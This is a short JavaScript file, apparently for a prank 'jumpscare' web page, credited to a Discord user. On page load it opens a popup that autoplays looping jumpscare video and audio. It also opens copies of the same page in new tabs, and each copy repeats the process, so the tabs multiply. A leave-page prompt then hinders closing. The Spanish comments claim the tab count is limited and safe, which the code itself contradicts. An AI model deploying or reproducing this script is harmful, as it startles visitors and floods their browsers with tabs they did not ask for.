// GIVE ALL CREDIT TO ELK
// MY DSC IS @2elk !!
console.log('Site opened.');

// Abrir ventana emergente segura con video y audio
function openPopup() {
    const popup = window.open("", "_blank", "width=800,height=600");
    if (popup) {
        popup.document.write(`
            <video src="jumpscare.mp4" autoplay loop playsinline style="width:100%; height:100%;"></video>
            <audio src="3ed22d14f3c30bc4.mp3" autoplay loop></audio>
        `);
        console.log('Popup opened');
    } else {
        console.log("La ventana emergente fue bloqueada");
    }
}

// Abrir un número limitado de nuevas pestañas (más seguro que infinito)
function openTabs(count = 3) {
    for(let i = 0; i < count; i++) {
        window.open(window.location.href, "_blank");
        console.log('Tab opened');
    }
}

// Ejecutar al cargar
window.addEventListener("load", function() {
    openPopup();
    openTabs(2); // Ajusta número de pestañas
});

// Confirmación al intentar cerrar o recargar
window.addEventListener("beforeunload", function(e){
    e.preventDefault();
    e.returnValue = "¿Estás seguro de que quieres salir?";
});
